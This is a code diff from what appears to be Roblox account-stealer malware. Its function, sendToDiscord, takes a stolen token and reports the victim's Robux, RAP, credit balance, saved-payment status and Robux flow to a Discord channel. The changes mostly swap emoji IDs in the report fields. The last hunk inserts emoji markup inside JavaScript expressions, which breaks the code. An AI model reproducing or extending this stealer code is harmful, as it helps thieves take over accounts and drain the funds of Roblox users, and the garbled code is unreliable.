@@ -1644,7 +1644,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: false
           },
           {
-            name: "<:robux:1397659164247068765> Robux (Pending)",
+            name: "<:emoji_31:1410233610031857735> Robux (Pending)",
             value: `${userData.robux || 0} (0)`,
             inline: true
           },
@@ -1654,7 +1654,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: true
           },
           {
-            name: "<:Dominus_Prize:1408080755531190272> RAP",
+            name: "<:emoji_32:1410233641371697313> RAP",
             value: userData.rap?.toString() || "0",
             inline: true
           },
@@ -1664,20 +1664,20 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             inline: true
           },
           {
-            name: "<a:Card:1408083250412523581> Credit Balance",
+            name: "<a:emoji_33:1410233678226788443> Credit Balance",
             value: userData.creditBalance && userData.creditBalance > 0 
               ? `$${userData.creditBalance} (Est. ${Math.floor(userData.creditBalance * 80)} Robux)`
               : "$0",
             inline: true
           },
           {
-            name: "<a:Card:1408083250412523581> Saved Payment",
+            name: "<a:emoji_33:1410233678226788443> Saved Payment",
             value: userData.savedPayment ? "True" : "False",
             inline: true
           },
           {
-            name: "Robux In/Out",
-            value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
+            name: "<:emoji_31:1410233610031857735> Robux In/Out",
+            value: `${userData.robuxIncoming ||<:emoji_31:1410233610031857735> 0}/${userData.robuxOutgoing ||<:emoji_31:1410233610031857735> 0}`,
             inline: true
           },
           {
